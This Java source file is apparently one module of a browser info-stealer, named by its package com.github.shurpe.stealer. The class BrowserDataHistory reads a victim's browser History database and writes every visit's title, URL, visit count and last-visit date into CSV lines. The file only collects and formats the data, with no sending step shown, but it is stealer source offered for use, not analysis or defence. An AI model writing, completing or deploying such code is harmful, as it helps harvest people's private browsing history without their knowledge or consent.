package com.github.shurpe.stealer.utils.browser.data;

import com.github.shurpe.stealer.utils.browser.BrowserProfile;
import com.github.shurpe.stealer.utils.Utils;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public final class BrowserDataHistory extends BrowserData {

	public final static String CSV_HEADER = "Browser,Title,URL,Visit Count,Last Visit Date\n";

	private final List<Visit> visits;

	public BrowserDataHistory(final BrowserProfile profile) {
		super(profile, "History", "urls");

		this.visits = new ArrayList<>();
		this.findResultSets();
	}

	@Override
	public void onResultSetFound(final ResultSet rs) {
		try {
			visits.add(new Visit(rs));
		} catch (SQLException ignored) {
		}
	}

	@Override
	public String toCsvColumn() {
		return super.toCsvColumn(visits);
	}

	public final static class Visit extends Data {

		private final String title, url, visitCount, lastVisitDate;

		public Visit(final ResultSet rs) throws SQLException {
			title = rs.getString("title");
			url = rs.getString("url");
			visitCount = rs.getString("visit_count");
			lastVisitDate = Utils.getDate(rs, "last_visit_time");
		}

		@Override
		public String toCsvColumn() {
			return '\"' + title + "\",\"" + url + "\",\"" + visitCount + "\",\"" + lastVisitDate + "\"\n";
		}
	}
}